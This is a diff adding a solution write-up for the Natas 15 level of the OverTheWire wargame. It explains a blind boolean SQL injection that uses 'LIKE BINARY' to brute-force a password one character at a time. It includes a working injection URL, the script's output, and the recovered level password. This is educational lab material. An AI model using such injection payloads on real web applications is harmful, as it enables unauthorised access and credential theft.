@@ -1,5 +1,44 @@
-Hint: 
+Hint: There might not be a way to make the server print the password this time. But you still may get an indication if you have the correct password or not.
 
-Solution: 
+Solution:
+This is the first tricky one that natas throws towards you. We see that none of the methods in source is printing the password. Also, there is no evaluation of the few places which output something so you can't exploit that. However, the sql injection is still possible in the $query that is being run. What the source also tells us is that it gives us an indication whether a user is present in the system or not. We can exploit this fact now. We'll craft a special input (username) which will change the query to check not just the username, but its password as well. We will also use the "LIKE" keyword to match partial passwords and "BINARY" to check for case sensitive matches. Using an input like below, we can then bruteforce the password from the webpage.
+http://natas15.natas.labs.overthewire.org/?debug=true&username=natas16%22%20and%20password%20LIKE%20BINARY%22W%
 
-Password: 
+See natas16.py for the full exploit code. You'll get an output like below:
+$python natas15.py
+Password detected so far: W
+Password detected so far: Wa
+Password detected so far: WaI
+Password detected so far: WaIH
+Password detected so far: WaIHE
+Password detected so far: WaIHEa
+Password detected so far: WaIHEac
+Password detected so far: WaIHEacj
+Password detected so far: WaIHEacj6
+Password detected so far: WaIHEacj63
+Password detected so far: WaIHEacj63w
+Password detected so far: WaIHEacj63wn
+Password detected so far: WaIHEacj63wnN
+Password detected so far: WaIHEacj63wnNI
+Password detected so far: WaIHEacj63wnNIB
+Password detected so far: WaIHEacj63wnNIBR
+Password detected so far: WaIHEacj63wnNIBRO
+Password detected so far: WaIHEacj63wnNIBROH
+Password detected so far: WaIHEacj63wnNIBROHe
+Password detected so far: WaIHEacj63wnNIBROHeq
+Password detected so far: WaIHEacj63wnNIBROHeqi
+Password detected so far: WaIHEacj63wnNIBROHeqi3
+Password detected so far: WaIHEacj63wnNIBROHeqi3p
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t0
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t0m
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t0m5
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t0m5n
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t0m5nh
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+Password detected so far: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+
+
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
